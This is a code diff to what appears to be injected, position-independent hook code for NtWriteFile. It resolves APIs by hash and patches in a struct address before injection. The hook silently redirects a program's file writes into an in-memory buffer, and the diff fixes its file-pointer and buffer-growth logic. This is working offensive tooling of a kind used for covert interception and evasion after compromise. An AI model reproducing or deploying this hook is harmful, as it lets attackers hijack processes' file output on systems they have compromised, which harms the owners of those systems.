@@ -28,7 +28,6 @@ SEC( text, B ) NTSTATUS Entry( HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE 
             Instance.Win32.free = LdrFunction( Instance.Modules.MSVCRT, 0x7c84d807 );
             Instance.Win32.sprintf_s = LdrFunction( Instance.Modules.MSVCRT, 0xe32a7d7d );
         } 
-
     }
 
 	//Placeholder string gets patched in with address of pFileInfo struct before it is injected
@@ -72,7 +71,10 @@ SEC( text, B ) NTSTATUS Entry( HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE 
 	if (matchfound)
 	{		
 		//If we don't have enough memory left in our buffer we need to double it until we do
-		if ((ULONG)(pFileInfo->fileallocationlen[i] - pFileInfo->filedatalen[i]) < Length)
+		//This condition can be reached one of two ways dependent on whether the writing program manipulates the file pointer or not
+		//1. buffer allocated - length of data written is less than the Length of data we have to write -> we need to increase the buffer size
+		//2. filepointer + length offset is greater than the end position of the buffer allocated -> we need to increase the buffer size
+		if ((ULONG)(pFileInfo->fileallocationlen[i] - pFileInfo->filedatalen[i]) < Length || (ULONG)pFileInfo->filedata[i] + (ULONG)pFileInfo->filepointer[i] + Length > (ULONG)pFileInfo->filedata[i] + (ULONG)pFileInfo->fileallocationlen[i])
 		{
 			while (TRUE)
 			{
@@ -83,10 +85,10 @@ SEC( text, B ) NTSTATUS Entry( HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE 
 				ULONG freemem = (ULONG)(pFileInfo->fileallocationlen[i] - pFileInfo->filedatalen[i]);
 
 				//Once we have enough freemem, break
-				if(freemem > Length)
+				//Note we are going to increase buffer size until we are good for either conditions specified above
+				if(freemem > Length && (ULONG)pFileInfo->filedata[i] + (ULONG)pFileInfo->filepointer[i] + Length < (ULONG)pFileInfo->filedata[i] + (ULONG)pFileInfo->fileallocationlen[i])
 					break;
 			}
-
 			//Now allocate a new buffer + copy our existing data into it
 			char* newbuf = Instance.Win32.malloc(pFileInfo->fileallocationlen[i] * sizeof(char));
             Instance.Win32.memset(newbuf, 0, pFileInfo->fileallocationlen[i] * sizeof(char));
@@ -99,8 +101,8 @@ SEC( text, B ) NTSTATUS Entry( HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE 
 			pFileInfo->filedata[i] = newbuf;
 		}
 
-		//Copy new data into buffer offset to the existing data already written
-		Instance.Win32.memcpy(pFileInfo->filedata[i] + pFileInfo->filedatalen[i], Buffer, Length);
+		//Copy new data into buffer at the offset indicated by the filepointer
+		Instance.Win32.memcpy(pFileInfo->filedata[i] + pFileInfo->filepointer[i], Buffer, Length);
 
 		//Update FileData data length with written bytes
 		pFileInfo->filedatalen[i] = pFileInfo->filedatalen[i] + Length;
@@ -108,6 +110,9 @@ SEC( text, B ) NTSTATUS Entry( HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE 
 		//Set IOStatusBlock member with length of data written
 		IoStatusBlock->Information = Length;
 		IoStatusBlock->Status = STATUS_SUCCESS;
+
+		//Update filepointer location to the end of the data we wrote
+		pFileInfo->filepointer[i] = pFileInfo->filepointer[i] + Length;
 
 		//Return NTSTATUS
 		return STATUS_SUCCESS;
